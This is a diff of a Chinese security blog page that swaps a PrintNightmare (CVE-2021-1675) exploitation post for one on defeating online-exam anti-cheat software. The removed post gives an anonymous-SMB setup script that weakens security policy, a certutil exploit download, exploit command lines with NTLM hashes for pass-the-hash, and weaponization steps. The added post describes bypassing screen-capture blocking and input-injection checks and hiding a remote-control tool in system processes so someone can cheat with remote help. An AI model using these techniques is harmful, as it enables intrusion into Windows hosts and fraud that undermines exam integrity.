@@ -16,27 +16,26 @@
   <meta name="author" content="qwqdanchun">
   <meta name="keywords" content="">
   
-    <meta name="description" content="概述CVE-2021-1675 &#x2F; CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节 复现攻击环境注意事项1.域相关目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Window">
+    <meta name="description" content="早在疫情期间就经历了好久的线上考试，最近又遇到了类似的需求，正好就写写相关的东西吧。为了防止暴露是哪几款软件，文中就不放图了，只是说说方法。 逆向相关目前遇到过的主流是C#&#x2F;Electron的程序，也有部分C++的程序。 C#的可以直接用DnSpy查看代码并修改 Electron的可以解包asar查看代码，修改后也可以打包替换回去 C++的一般IDA辅助分析后，可以手动跳过部分函数或判断">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PrintNightmare 实战利用Tips">
-<meta property="og:url" content="https://blog.qwqdanchun.com/PrintNightmare/index.html">
+<meta property="og:title" content="记录绕过某考试软件的安全防护">
+<meta property="og:url" content="https://blog.qwqdanchun.com/Bypass_Secure_Browser/index.html">
 <meta property="og:site_name" content="簞純&#39;s Blog">
-<meta property="og:description" content="概述CVE-2021-1675 &#x2F; CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节 复现攻击环境注意事项1.域相关目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Window">
+<meta property="og:description" content="早在疫情期间就经历了好久的线上考试，最近又遇到了类似的需求，正好就写写相关的东西吧。为了防止暴露是哪几款软件，文中就不放图了，只是说说方法。 逆向相关目前遇到过的主流是C#&#x2F;Electron的程序，也有部分C++的程序。 C#的可以直接用DnSpy查看代码并修改 Electron的可以解包asar查看代码，修改后也可以打包替换回去 C++的一般IDA辅助分析后，可以手动跳过部分函数或判断">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-11-12T19:34:50.000Z">
-<meta property="article:modified_time" content="2023-03-16T14:48:21.599Z">
+<meta property="article:published_time" content="2023-03-16T05:30:29.000Z">
+<meta property="article:modified_time" content="2023-03-16T14:48:21.595Z">
 <meta property="article:author" content="qwqdanchun">
-<meta property="article:tag" content="0&#x2F;N Day">
-<meta property="article:tag" content="PrintNightmare">
-<meta property="article:tag" content="CVE-2021-1675">
-<meta property="article:tag" content="CVE-2021-34527">
+<meta property="article:tag" content=".Net">
+<meta property="article:tag" content="Crack">
+<meta property="article:tag" content="Electron">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>PrintNightmare 实战利用Tips - 簞純&#39;s Blog</title>
+  <title>记录绕过某考试软件的安全防护 - 簞純&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +212,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="PrintNightmare 实战利用Tips"></span>
+            <span id="subtitle" data-typed-text="记录绕过某考试软件的安全防护"></span>
           
         </div>
 
@@ -229,8 +228,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-13 03:34" pubdate>
-          2022年11月13日 凌晨
+        <time datetime="2023-03-16 13:30" pubdate>
+          2023年3月16日 下午
         </time>
       </span>
     
@@ -241,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.6k 字
+          1k 字
         
       </span>
     
@@ -252,7 +251,7 @@
         
         
         
-          39 分钟
+          9 分钟
         
       </span>
     
@@ -305,17 +304,17 @@
     
     <div class="category row nomargin-x">
       <a class="category-item 
-          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Develop"
-        id="heading-1bedc6fb14c15b2e99872ebdbc317bf2" role="tab" data-toggle="collapse" href="#collapse-1bedc6fb14c15b2e99872ebdbc317bf2"
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Crack"
+        id="heading-6cbffac928650245da33369dedceb579" role="tab" data-toggle="collapse" href="#collapse-6cbffac928650245da33369dedceb579"
         aria-expanded="true"
       >
-        Develop
-        <span class="list-group-count">(3)</span>
+        Crack
+        <span class="list-group-count">(1)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse show" id="collapse-1bedc6fb14c15b2e99872ebdbc317bf2"
-           role="tabpanel" aria-labelledby="heading-1bedc6fb14c15b2e99872ebdbc317bf2">
+      <div class="category-collapse collapse show" id="collapse-6cbffac928650245da33369dedceb579"
+           role="tabpanel" aria-labelledby="heading-6cbffac928650245da33369dedceb579">
         
         
           
@@ -324,28 +323,10 @@
     
       
       
-        <a href="/PrintNightmare/" title="PrintNightmare 实战利用Tips"
+        <a href="/Bypass_Secure_Browser/" title="记录绕过某考试软件的安全防护"
            class="list-group-item list-group-item-action
            active">
-          <span class="category-post">PrintNightmare 实战利用Tips</span>
-        </a>
-      
-    
-      
-      
-        <a href="/CobaltStrike_Modify/" title="CobaltStrike二次开发"
-           class="list-group-item list-group-item-action
-           ">
-          <span class="category-post">CobaltStrike二次开发</span>
-        </a>
-      
-    
-      
-      
-        <a href="/Appdomain_AntiVM/" title="一种利用Appdomain特性实现隐蔽的反沙箱分析"
-           class="list-group-item list-group-item-action
-           ">
-          <span class="category-post">一种利用Appdomain特性实现隐蔽的反沙箱分析</span>
+          <span class="category-post">记录绕过某考试软件的安全防护</span>
         </a>
       
     
@@ -368,7 +349,7 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">PrintNightmare 实战利用Tips</h1>
+            <h1 style="display: none">记录绕过某考试软件的安全防护</h1>
             
               <p class="note note-info">
                 
@@ -381,45 +362,24 @@
             
               <div class="markdown-body">
                 
-                <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h1><p><strong>CVE-2021-1675 &#x2F; CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节</strong></p>
-<h1 id="复现攻击环境"><a href="#复现攻击环境" class="headerlink" title="复现攻击环境"></a>复现攻击环境</h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="1-域相关"><a href="#1-域相关" class="headerlink" title="1.域相关"></a>1.域相关</h3><p>目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Server机器时，攻击机器为目标机器可以访问到的另一机器即可</p>
-<blockquote>
-<p>加入域后的Windows系统访问外部资源会携带已登录的域用户凭证，所以未加入域且未提前指定凭据的的SMB就无法访问。因此攻击域内机器有此限制</p>
-</blockquote>
-<h3 id="2-SMBv1"><a href="#2-SMBv1" class="headerlink" title="2.SMBv1"></a>2.SMBv1</h3><p>攻击机器为Windows Server 2019及更高版本时，需要执行 <code>Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol</code>并重启去开启SMBv1，否则有可能出现rpc_s_access_denied的问题，攻击机器为2016及更低版本的系统时，可以直接使用 <code>Set-SmbServerConfiguration -EnableSMB1Protocol $true</code>开启SMBv1的支持</p>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-准备payload"><a href="#1-准备payload" class="headerlink" title="1.准备payload"></a>1.准备payload</h3><p>在攻击机器创建C:\share文件夹，并将dll放入其中（此路径可根据需求修改，修改后下一步脚本自行对应修改）</p>
-<h3 id="2-开启SMB匿名共享"><a href="#2-开启SMB匿名共享" class="headerlink" title="2.开启SMB匿名共享"></a>2.开启SMB匿名共享</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br><span class="hljs-comment">#修改路径权限，使所有人可读</span><br>icacls C:\share\ /T /grant Anonymous` logon:F<br>icacls C:\share\ /T /grant Everyone:F<br><span class="hljs-comment">#创建名称为share路径为C:\share的SMB共享</span><br><span class="hljs-built_in">New-SmbShare</span> <span class="hljs-literal">-Path</span> C:\share <span class="hljs-literal">-Name</span> share <span class="hljs-literal">-FullAccess</span> <span class="hljs-string">&#x27;ANONYMOUS LOGON&#x27;</span>,<span class="hljs-string">&#x27;Everyone&#x27;</span><br><span class="hljs-comment">#启用guest用户</span><br>net user guest /active:yes<br><span class="hljs-comment">#覆盖已有的NullSessionPipes配置</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span> /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f<br><span class="hljs-comment">#设置可以匿名访问共享</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span> /v NullSessionShares /t REG_MULTI_SZ /d share /f<br><span class="hljs-comment">#设置Everyone权限包含匿名登录用户</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v EveryoneIncludesAnonymous /t REG_DWORD /d <span class="hljs-number">1</span> /f<br><span class="hljs-comment">#设置任何用户都可以通过网络获取本机的信息</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v RestrictAnonymous /t REG_DWORD /d <span class="hljs-number">0</span> /f<br><span class="hljs-comment">#提取本地安全组策略</span><br>secedit /export /cfg gp.inf /quiet<br><span class="hljs-comment">#修改组策略中的指定权限</span><br>(<span class="hljs-built_in">Get-Content</span> gp.inf) <span class="hljs-operator">-replace</span> <span class="hljs-string">&quot;SeDenyNetworkLogonRight = Guest&quot;</span>,<span class="hljs-string">&quot;SeDenyNetworkLogonRight = &quot;</span> | <span class="hljs-built_in">Set-Content</span> <span class="hljs-string">&quot;gp.inf&quot;</span><br><span class="hljs-comment">#导入本地安全组策略</span><br>secedit /configure /db gp.sdb /cfg gp.inf /quiet<br><span class="hljs-comment">#更新本地安全组策略</span><br>CMD.EXE /C <span class="hljs-string">&quot;gpupdate/force&quot;</span><br><span class="hljs-comment">#清理文件</span><br>CMD.EXE /C <span class="hljs-string">&quot;del gp.inf&quot;</span><br>CMD.EXE /C <span class="hljs-string">&quot;del gp.sdb&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>注：此脚本修改自<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">Invoke-BuildAnonymousSMBServer</a></p>
-<h3 id="3-准备exp"><a href="#3-准备exp" class="headerlink" title="3.准备exp"></a>3.准备exp</h3><h4 id="选择exp"><a href="#选择exp" class="headerlink" title="选择exp"></a>选择exp</h4><p>推荐exp为<a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py">CVE-2021-1675.py</a>，主要优势在于可以使用hash进行攻击，现在越来越难搞到密码了，hash的场景更多</p>
-<p>因为大部分目标环境不会有python环境，所以最好打包为exe使用</p>
-<h4 id="打包exe"><a href="#打包exe" class="headerlink" title="打包exe"></a>打包exe</h4><p>打包使用Windows Server 2008 R2机器，安装<a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe">Python3.8</a>，<a target="_blank" rel="noopener" href="https://github.com/git-for-windows/git/releases/download/v2.38.1.windows.1/Git-2.38.1-64-bit.exe">Git</a>，之后执行以下命令</p>
-<blockquote>
-<p><em>Windows Server 2008 R2以保证大部分系统能正常运行，Python版本推荐3.8.10，可低不可高</em></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/cube0x0/impacket<br><span class="hljs-built_in">cd</span> impacket<br>certutil -urlcache -<span class="hljs-built_in">split</span> -f https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py CVE-2021-1675.py<br>pip3 install six pycryptodomex pyasn1 pyinstaller<br>pyinstaller --clean --onefile CVE-2021-1675.py<br></code></pre></td></tr></table></figure>
-
-<p>生成的文件在 <code>\impacket\dist\CVE-2021-1675.exe</code></p>
-<h3 id="4-执行"><a href="#4-执行" class="headerlink" title="4.执行"></a>4.执行</h3><p>示例：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br></code></pre></td></tr></table></figure>
-
-<h1 id="武器化思路"><a href="#武器化思路" class="headerlink" title="武器化思路"></a>武器化思路</h1><p>按照上文的方法已经足够应付大多数攻击场景了，但是如果从武器化开发的角度来看，pyinstaller这东西还是太不优雅了，所以我们回头看向了另一份poc，<a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare">SharpPrintNightmare</a>，对这份代码稍作修改即可实现使用hash验证身份的功能</p>
-<h2 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.背景介绍"></a>1.背景介绍</h2><p>Pass The Hash这项技术实现起来，有两种思路，一种是自己构造包然后发包完成验证，另一种是修改自己进程或线程内存中保存的身份验证信息并修改。</p>
-<h2 id="2-确定思路"><a href="#2-确定思路" class="headerlink" title="2.确定思路"></a>2.确定思路</h2><p>为了方便开发，这里选用第二种方法。毕竟去翻RPC和SMB的文档是一个很让人头疼的事……</p>
-<p>而第二种方法的典型案例就是mimikatz，所以首先使用mimikatz进行简单的测试</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">sekurlsa::pth /user:John /domain:192.168.0.111 /ntlm:f0cff78ea8d2d87e5d1caccf01d0bd2f /run:&quot;SharpPrintNightmare.exe&quot;<br><br>注：为了方便测试，此处我已经修改SharpPrintNightmare代码，并写死了参数<br></code></pre></td></tr></table></figure>
-
-<p>可以发现思路可行，确定了patch的方案</p>
-<p>mimikatz有一个C#的版本<a target="_blank" rel="noopener" href="https://github.com/b4rtik/SharpKatz">SharpKatz</a>，<del>抄袭</del>参考其中pth功能的实现代码即可</p>
-<p>SharpKatz中的此部分代码基本完全由mimikatz的代码翻译而成，建议先看其中任意一个的代码了解下原理。</p>
-<p>总结后需要对SharpPrintNightmare进行的修改为：</p>
-<ul>
-<li>添加pth选项，进行参数判断</li>
-<li>修改原项目的Impersonator类，如果使用pth就不再执行LogonUser函数，改为使用SharpKatz中的pth模块的<a target="_blank" rel="noopener" href="https://github.com/b4rtik/SharpKatz/blob/87e8e6661999d19bbcae3c0623f78dc2a1a9b45f/SharpKatz/Module/Pth.cs#L34">CreateProcess</a>函数（此处需要将SharpKatz的对应代码集成进来），注意将impersonate设置为true，以便使用当前线程去连接，而不是使用新进程（方便内存加载）</li>
-<li><a target="_blank" rel="noopener" href="https://github.com/b4rtik/SharpKatz">SharpKatz</a>的pth中所需的内存查找的特征不全，需要参考mimikatz中的补全</li>
-</ul>
-<p>确定了以上修改方案，再完善一下使用细节，以及对应的文本提示与错误反馈即可完成工具的武器化</p>
-<h2 id="3-成果"><a href="#3-成果" class="headerlink" title="3.成果"></a>3.成果</h2><p>因为各种原因，就不放成品了，有兴趣的可以自己按照步骤修改一遍啦</p>
+                <p>早在疫情期间就经历了好久的线上考试，最近又遇到了类似的需求，正好就写写相关的东西吧。为了防止暴露是哪几款软件，文中就不放图了，只是说说方法。</p>
+<h1 id="逆向相关"><a href="#逆向相关" class="headerlink" title="逆向相关"></a>逆向相关</h1><p>目前遇到过的主流是C#&#x2F;Electron的程序，也有部分C++的程序。</p>
+<p>C#的可以直接用DnSpy查看代码并修改</p>
+<p>Electron的可以解包asar查看代码，修改后也可以打包替换回去</p>
+<p>C++的一般IDA辅助分析后，可以手动跳过部分函数或判断</p>
+<p>目前还未发现对自身文件进行校验的例子，如果后续出现，还需要hook相关函数进行绕过</p>
+<p>注意有些修改不能无脑删除函数，因为有些会有操作记录等要注意保留</p>
+<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>想办法进入考试模式，进行初步测试，在进入前上线远控（为防止部分软件限制未知进程，可以直接注入系统进程），并记录考试过程中存在的进程，以及考试相关进程加载的dll。对这些文件进行简单的筛选即可找到涉及反作弊的文件。</p>
+<p>以下描述注意针对考试中使用远控远程辅助答题的情况</p>
+<h1 id="防护措施及应对"><a href="#防护措施及应对" class="headerlink" title="防护措施及应对"></a>防护措施及应对</h1><h2 id="1-截屏"><a href="#1-截屏" class="headerlink" title="1.截屏"></a>1.截屏</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Windows下考试软件防止截屏的方法其实很简单，都是基于<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowdisplayaffinity">SetWindowDisplayAffinity</a>这个api</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>逆向后删除此函数调用，或者修改第二个参数内容即可。如果是Electron的浏览器，可以去ASAR解包的代码中搜索setContentProtection，如果存在，也删除其调用</p>
+<h2 id="2-模拟输入"><a href="#2-模拟输入" class="headerlink" title="2.模拟输入"></a>2.模拟输入</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>SetWindowsHookEx挂钩WH_KEYBOARD_LL，并判断KBDLLHOOKSTRUCT的flags，模拟键盘输入时flags为LLKHF_INJECTED</p>
+<p>SetWindowsHookEx挂钩WH_MOUSE_LL，并判断MOUSEHOOKSTRUCT的wHitTestCode，在真实鼠标按键时为0，而在使用模拟鼠标时，为1</p>
+<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>1.逆向查找挂钩的回调函数（搜索CallNextHookEx调用，一般此调用上面几行就是过滤函数），修改判断条件或直接删除相关内容即可</p>
+<p>2.SetWindowsHookEx的回调是一个链，后添加的先处理，也就是说只有保证自己的回调在链的头部，即可自己修改flags值再CallNextHookEx继续传递</p>
+<h2 id="3-进程"><a href="#3-进程" class="headerlink" title="3.进程"></a>3.进程</h2><p>将使用的远控注入进系统进程，规避可疑进程名的检测，不过大多数考试软件也没有太多的进程检测，也检测不过来</p>
+<h2 id="4-流量"><a href="#4-流量" class="headerlink" title="4.流量"></a>4.流量</h2><p>可以通过代理抓包，部分考试软件回传信息没有加密，可以直接拦包之后正则匹配改包再重发</p>
+<h1 id="叠甲"><a href="#叠甲" class="headerlink" title="叠甲"></a>叠甲</h1><p>本文内容仅供技术研究，请勿用于非法行为。</p>
 
                 
               </div>
@@ -438,7 +398,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Develop/" class="category-chain-item">Develop</a>
+  <a href="/categories/Crack/" class="category-chain-item">Crack</a>
   
   
 
@@ -453,13 +413,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/0-N-Day/">#0/N Day</a>
+        <a href="/tags/Net/">#.Net</a>
       
-        <a href="/tags/PrintNightmare/">#PrintNightmare</a>
+        <a href="/tags/Crack/">#Crack</a>
       
-        <a href="/tags/CVE-2021-1675/">#CVE-2021-1675</a>
-      
-        <a href="/tags/CVE-2021-34527/">#CVE-2021-34527</a>
+        <a href="/tags/Electron/">#Electron</a>
       
     </div>
   
@@ -471,8 +429,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>PrintNightmare 实战利用Tips</div>
-      <div>https://blog.qwqdanchun.com/PrintNightmare/</div>
+      <div>记录绕过某考试软件的安全防护</div>
+      <div>https://blog.qwqdanchun.com/Bypass_Secure_Browser/</div>
     </div>
     <div class="license-meta">
       
@@ -484,7 +442,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年11月13日</div>
+          <div>2023年3月16日</div>
         </div>
       
       
@@ -527,18 +485,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/CodePage_injection/" title="Code Page注入方法的武器化">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Code Page注入方法的武器化</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/hello-world/" title="Hello World Again">
-                        <span class="hidden-mobile">Hello World Again</span>
+                      <a href="/Bypass_Startup/" title="一个不太好用的过360启动方案">
+                        <span class="hidden-mobile">一个不太好用的过360启动方案</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -556,8 +508,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'https://blog.qwqdanchun.com/PrintNightmare/';
-          this.page.identifier = '/PrintNightmare/';
+          this.page.url = 'https://blog.qwqdanchun.com/Bypass_Secure_Browser/';
+          this.page.identifier = '/Bypass_Secure_Browser/';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
